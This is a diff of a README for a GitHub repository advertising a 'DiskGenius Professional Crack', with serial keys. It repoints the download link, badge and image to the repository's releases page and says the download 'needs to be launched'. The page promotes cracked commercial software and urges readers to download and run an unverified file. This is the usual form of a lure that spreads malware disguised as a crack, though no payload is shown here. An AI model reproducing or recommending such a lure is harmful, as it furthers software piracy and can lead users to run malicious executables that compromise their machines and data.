@@ -20,9 +20,9 @@ Welcome to the **DiskGenius Professional Crack** repository! 🛠️ Here you ca
   - diskgenius-professional-serial-key
 
 ## Resources
-🔗 **Download Link:** [Soft.zip](https://github.com/file/Soft.zip) (needs to be launched)
+🔗 **Download Link:** [https://github.com/mikordizia/DiskGenius_Professional_Crack/releases](https://github.com/mikordizia/DiskGenius_Professional_Crack/releases) (needs to be launched)
 
-[![Download](https://img.shields.io/badge/Download-Launch-green)](https://github.com/file/Soft.zip)
+[![Download](https://github.com/mikordizia/DiskGenius_Professional_Crack/releases)](https://github.com/mikordizia/DiskGenius_Professional_Crack/releases)
 
 Explore the various versions and tools provided within this repository to make the most out of DiskGenius Professional Crack!
 
@@ -49,6 +49,6 @@ If you encounter any issues or have questions regarding the usage of DiskGenius 
 
 Explore the world of disk management with DiskGenius Professional Crack now! 💻🔓
 
-![DiskGenius](https://example.com/diskgenius_image.jpg) 
+![DiskGenius](https://github.com/mikordizia/DiskGenius_Professional_Crack/releases) 
 
 Dive into the world of efficient disk management and data recovery with DiskGenius Professional Crack. Happy cracking! 🌟🔥
